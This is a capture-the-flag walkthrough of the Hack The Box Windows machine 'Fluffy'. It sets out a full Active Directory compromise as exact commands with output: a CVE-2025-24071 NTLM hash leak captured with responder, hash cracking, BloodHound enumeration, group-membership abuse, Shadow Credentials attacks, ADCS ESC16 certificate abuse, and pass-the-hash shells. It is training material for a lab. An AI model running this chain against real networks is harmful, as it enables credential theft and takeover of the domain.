---
icon: windows
layout:
  width: wide
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
  metadata:
    visible: false
  tags:
    visible: true
---

# Fluffy Machine Walk-through

<figure><img src="../.gitbook/assets/image (23).png" alt=""><figcaption></figcaption></figure>

### Machine Information

Fluffy is a easy level Windows machine from session 8.

As is common in real life Windows pentests, you will start the Fluffy box with credentials for the following account: `j.fleischman / J0elTHEM4n1990!`

> #### Note:<br>
>
> In some of the next steps we may get a **“Clock skew too great”** error. Then run the following command to fix the probelm:
>
> ```bash
> sudo ntpdate <target>
> ```
>
> Becouse Kerberos is very sensitive to time synchronization. If the clock difference between your machine and the terget machine is more than 5 minutes, authentication fails. This is a security feature in Kerberos to prevent replay attacks.

***

### Step-1

First we perform the Nmap Scan for open Ports and Services:

```bash
nmap -sV -T4 10.10.11.69
                           
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-30 17:43 IST
Nmap scan report for fluffy.htb (10.10.11.69)
Host is up (0.082s latency).
Not shown: 989 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-07-30 18:50:06Z)
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 53.28 seconds
```

We found many open ports. and also we found the DC name and the domain name: `fluffy.htb, DC01.fluffy.htb`

***

### Step-2

Add the `fluffy.htb, DC01.fluffy.htb` to our machine `/etc/hosts` file.

```bash
sudo echo "10.10.11.69 fluffy.htb DC01.fluffy.htb" | sudo tee -a /etc/hosts
```

***

### Step-3

Now in previous nmap scan we found that the SMB port is open (139, 445). So, We look into SMB to see any interesting share/s by using the given credentials:

```bash
smbmap -H 10.10.11.69 -u 'j.fleischman' -p 'J0elTHEM4n1990!'
```

<figure><img src="../.gitbook/assets/image (24).png" alt=""><figcaption></figcaption></figure>

We see the interesting share called `IT` which has **READ, WRITE** permission.

***

### Step-4

Now we try to connect with the `IT` shared folder to see the contents.

```bash
smbclient //10.10.11.69/IT -U  j.fleischman 
```

<figure><img src="../.gitbook/assets/image (25).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (26).png" alt=""><figcaption></figcaption></figure>

We can see the **Upgrade\_Notice.pdf** file and after download and open this Give some of the latest CVE Vulnerability [CVE-2025-24071 (Critical)](https://github.com/0x6rss/CVE-2025-24071_PoC)

> About the CVE-2025-24071: NTLM Hash Leak via RAR/ZIP Extraction and .library-ms File

***

### Step-5

Now download the **poc.py** file and run using python3. And in another terminal run `responder` to capture the NTLM Hash.

<figure><img src="../.gitbook/assets/image (27).png" alt=""><figcaption></figcaption></figure>

After running the script we can see the **exploit.zip** file was created.

<figure><img src="../.gitbook/assets/image (28).png" alt=""><figcaption></figcaption></figure>

Now upload the **exploit.zip** file into the **IT** directory and in another terminal run `responder` to capture the NTLM Hash.

<figure><img src="../.gitbook/assets/image (29).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (30).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (33).png" alt=""><figcaption></figcaption></figure>

***

### Step-6

Now we try to crack the Hash using John

```bash
 john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

<figure><img src="../.gitbook/assets/image (32).png" alt=""><figcaption></figcaption></figure>

***

### Step-7

Now we try to collects Active Directory data from the domain `fluffy.htb` and generates a zipped. BloodHound ingestion file using credentials for `p.agila`.

```bash
bloodhound-python -u 'p.agila' -p 'prometheusx-303'  -d fluffy.htb -ns 10.10.11.69 -c All --zip 
```

<figure><img src="../.gitbook/assets/image (34).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (35).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (36).png" alt=""><figcaption></figcaption></figure>

Looking the relationships for **p.agila** and **j.fleischman** the only with interesting ones is **p.agila.**\
The user **p.agila** is member of **SERVICE ACCOUNT MANAGERS** and this group has **GenericAll** to the **SERVICE ACCOUNTS** group and then **SERVICE ACCOUNTS** has **GenericWrite** relationship to **ca\_svc**, **ldap\_svc** and **winrm\_svc** accounts.\
With the **GenericAll** relationship we can directly modify the group members so we can add **p.agila** to **SERVICE ACCOUNTS** and after that we can do a **Shadow Credential** attack to any of the previous mentioned accounts.

***

### Step-8

First, we need to add **p.agila** user to **SERVICE ACCOUNTS** group:

```bash
bloodyAD --host '10.10.11.69' -d 'dc01.fluffy.htb' -u 'p.agila' -p 'prometheusx-303'  add groupMember 'SERVICE ACCOUNTS' p.agila
```

Also you can use this command to do this:

```bash
net rpc group addmem "SERVICE ACCOUNTS" "p.agila" -U "fluffy.htb"/"p.agila"%"prometheusx-303" -S "DC01.fluffy.htb"
```

***

### Step-9

Now we perform **Shadow Credential** attack by using **pywhisker**, **gettgtpkinit** and **getnthash** tools. The first account i tried to attack was **winrm\_svc** just because it has remote access rights so then i can attempt to do **evil-winrm**.

* **Pywhishker** 🔗Source: \[https://github.com/ShutdownRepo/pywhisker]
* **PKINITtools** 🔗Source: \[https://github.com/dirkjanm/PKINITtools]

```bash
python3 pywhisker/pywhisker/pywhisker.py -d "fluffy.htb" -u "p.agila" -p "prometheusx-303" --target "winrm_svc" --action "add"
```

<figure><img src="../.gitbook/assets/image (37).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (38).png" alt=""><figcaption></figcaption></figure>

Here we can see `97Ikvxf1_cert.pem` and `97Ikvxf1_priv.pem` two files are created.

Now we try to request TGT by using this two files:

```bash
python3 gettgtpkinit.py -cert-pem 97Ikvxf1_cert.pem -key-pem 97Ikvxf1_priv.pem fluffy.htb/winrm_svc winrm_svc.ccache
```

After that we can see `winrm_svc.ccache` file was created means `winrm_svc` Kerberos TGT was saved to a .ccache file

<figure><img src="../.gitbook/assets/image (39).png" alt=""><figcaption></figcaption></figure>

To support Kerberos will use this ticket run:

```bash
export KRB5CCNAME=winrm_svc.ccache
```

Now we try to get NT hash of the `winrm_svc` account in **fluffy.htb** domain using the **AS-REP decryption key**. And we successfully get the NT hash of `winrm_svc` user.

```bash
 python3 getnthash.py -key d82752e501ee6c6ed89e9aaf980c1c8d476c220159e0866026b1c7989f115c02  fluffy.htb/winrm_svc
```

<figure><img src="../.gitbook/assets/image (40).png" alt=""><figcaption></figcaption></figure>

***

### Step-10

Now we try to get remote access the system by using the hash. And we successfully get remote access and user flag.

```bash
evil-winrm -i 10.10.11.69 -u winrm_svc -H 33bd09dcd697600edf6b3a7af4875767
```

<figure><img src="../.gitbook/assets/image (41).png" alt=""><figcaption></figcaption></figure>

***

### Step-11

Now again we use the same techinqu to access `CA_SVC` user NT Hash:

```bash
python3 pywhisker/pywhisker.py -d "fluffy.htb" -u "p.agila" -p "prometheusx-303" --target "ca_svc" --action "add"

python3 gettgtpkinit.py -cert-pem 25eP697K_cert.pem -key-pem 25eP697K_priv.pem fluffy.htb/ca_svc ca_svc.ccache

python3 getnthash.py -key daf76ac1c4a3c08fd11290619dd915ba81b339ff3adcb716cbff49416adaf885 fluffy.htb/ca_svc
```

<figure><img src="../.gitbook/assets/image (42).png" alt=""><figcaption></figcaption></figure>

***

### Step-12

Now we perform vulnerability scan against **Active Directory Certificate Services (ADCS)** using `certipy-ad` with the following command:

```bash
certipy-ad find -vulnerable -u ca_svc@fluffy.htb -hashes ca0f4f9e9eb8a092addf53bb03fc98c8  -dc-ip 10.10.11.69 -stdout
```

**output:**

```bash
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 33 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 11 enabled certificate templates
[*] Finding issuance policies
[*] Found 14 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'fluffy-DC01-CA' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Successfully retrieved CA configuration for 'fluffy-DC01-CA'
[*] Checking web enrollment for CA 'fluffy-DC01-CA' @ 'DC01.fluffy.htb'
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : fluffy-DC01-CA
    DNS Name                            : DC01.fluffy.htb
    Certificate Subject                 : CN=fluffy-DC01-CA, DC=fluffy, DC=htb
    Certificate Serial Number           : 3670C4A715B864BB497F7CD72119B6F5
    Certificate Validity Start          : 2025-04-17 16:00:16+00:00
    Certificate Validity End            : 3024-04-17 16:11:16+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Disabled Extensions                 : 1.3.6.1.4.1.311.25.2
    Permissions
      Owner                             : FLUFFY.HTB\Administrators
      Access Rights
        ManageCa                        : FLUFFY.HTB\Domain Admins
                                          FLUFFY.HTB\Enterprise Admins
                                          FLUFFY.HTB\Administrators
        ManageCertificates              : FLUFFY.HTB\Domain Admins
                                          FLUFFY.HTB\Enterprise Admins
                                          FLUFFY.HTB\Administrators
        Enroll                          : FLUFFY.HTB\Cert Publishers
    [!] Vulnerabilities
      ESC16                             : Security Extension is disabled.
    [*] Remarks
      ESC16                             : Other prerequisites may be required for this to be exploitable. See the wiki for more details.
Certificate Templates                   : [!] Could not find any certificate templates
```

🔥 Vulnerability Found: ESC16

```bash
[!] Vulnerabilities
  ESC16: Security Extension is disabled.
  Remarks: Other prerequisites may be required for this to be exploitable.
```

📛 What Is ESC16?\
ESC16 is a known ADCS misconfiguration:\
If the Security Extension is disabled, the CA will not check for any extended usage or template restrictions on incoming certificate requests — it may issue certs more permissively.\
This might allow you to request high-privilege certs (e.g., for domain controller accounts), depending on the template permissions and available request mechanisms.

👉 Read more about this vulnerability: \[https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc16-security-extension-disabled-on-ca-globally]

***

### Step-13

Now we Read initial UPN of the victim account:

```bash
certipy-ad account -u 'p.agila@fluffy.htb' -p 'prometheusx-303' -dc-ip '10.10.11.69' -user 'ca_svc' read
```

<figure><img src="../.gitbook/assets/image (43).png" alt=""><figcaption></figcaption></figure>

***

### Step-14

Update the victim account’s UPN to the target administrator’s sAMAccountName:

```bash
certipy-ad account -u 'p.agila@fluffy.htb' -p 'prometheusx-303' -dc-ip '10.10.11.69' -upn 'administrator' -user 'ca_svc' update
```

<figure><img src="../.gitbook/assets/image (44).png" alt=""><figcaption></figcaption></figure>

***

### Step-14

Now we trying to Request a certificate as the “victim” user from any suitable client authentication template (e.g., “User”) on the ESC16-vulnerable CA:

```bash
certipy-ad req -k -dc-ip '10.10.11.69' -target 'DC01.FLUFFY.HTB' -ca 'fluffy-DC01-CA' -template 'User'
```

<figure><img src="../.gitbook/assets/image (45).png" alt=""><figcaption></figcaption></figure>

We can see `administrator.pfx` file was created.\
The `administrator.pfx` file is a **PKCS#12** certificate bundle that contains:

* A digital certificate for the administrator user (issued by the Active Directory Certificate Authority), and
* The corresponding private key.

***

### Step-15

Now Restore the UPN for the “Victim” account.

```bash
certipy-ad account -u 'p.agila@fluffy.htb' -p 'prometheusx-303' -dc-ip '10.10.11.69' -upn 'ca_svc@fluffy.htb' -user 'ca_svc' update
```

<figure><img src="../.gitbook/assets/image (46).png" alt=""><figcaption></figcaption></figure>

***

### Step-16

Now we try to Authenticate as the target administrator by using `administrator.pfx` file:

```bash
certipy-ad auth -dc-ip '10.10.11.69' -pfx 'administrator.pfx' -username 'administrator' -domain 'fluffy.htb'
```

<figure><img src="../.gitbook/assets/image (47).png" alt=""><figcaption></figcaption></figure>

We successfully got hash for `administrator@fluffy.htb`

***

### Step-17

Now try to gain remote access administrator account useing given hash:

```bash
impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:8da83a3fa618b6e3a00e93f676c92a6e Administrator@10.10.11.69
```

We successfully get remte access and get root flag.

<figure><img src="../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

***

> _I hope you enjoyed this writeup! Happy Hacking :)_
>
> _Follow to me on Medium and be sure to turn on email notifications so you never miss out on my latest informative posts._

#### Follow me on below Social Media:

1. _**LinkedIn:**_ [_**Subhadip Sardar**_](http://linkedin.com/in/subhadip-sardar)
2. _**Twitter | X :**_ [_**@Mr\_SubhaDip03**_](https://x.com/Mr_SubhaDip03)
3. _**GitHub :**_ [_**SubhaDip003**_](https://github.com/SubhaDip003)
4. _**Check My TryHackMe Profile :**_ [_**TryHackMe | SubhaDip**_](https://tryhackme.com/r/p/SubhaDip)
5. _**Check My HackTheBox Profile:**_ [_**Hack The Box | SubhaDip03**_](https://app.hackthebox.com/profile/1658126)
